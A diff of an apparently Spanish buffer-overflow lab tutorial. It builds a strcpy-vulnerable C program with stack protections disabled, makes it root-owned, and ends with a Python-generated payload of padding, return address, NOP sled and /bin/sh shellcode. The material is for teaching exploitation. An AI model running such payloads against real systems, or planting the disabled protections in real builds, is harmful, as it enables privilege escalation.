@@ -1,20 +1,25 @@
+**EXPLICACÍON DETALLADA EN** [Buffer Overflow 32 Bits Linux]()
 ## Script
 ```bash
 #include <stdio.h>
+#include <string.h>
 
-void vuln(char *buff){
-	char buffer[64];
-	strcopy(buffer, buff);
+int vuln(char *str)
+{
+    char buf[64];
+    strcpy(buf,str);
+    printf("Cadena: %s\n",buf);
+    return 0;
 }
-
-void main(int argc, char **argv){
-	vuln(argv[1]);
+int main(int argc, char* argv[])
+{
+    vuln(argv[1]);
 }
 ```
 ## Compilacion
  ```bash
- gcc -z execstack -g -fno-stack-protector -mpreferred-stack-boundary=2 buff.c -o buff
- ```
+gcc -g -fno-stack-protector -z execstack -m32 buff.c -o buff
+```
  ## Permisos
  ```bash
  chown root:root buff
@@ -63,5 +68,5 @@ void main(int argc, char **argv){
  ```
  Payload final
  ```bash
- $(python -c 'print "A"*68 + "\xd4\xf4\xff\xbf" + "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+ $(python -c 'print "A"*76 + "\xa0\xef\xff\xbf" + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
 ```
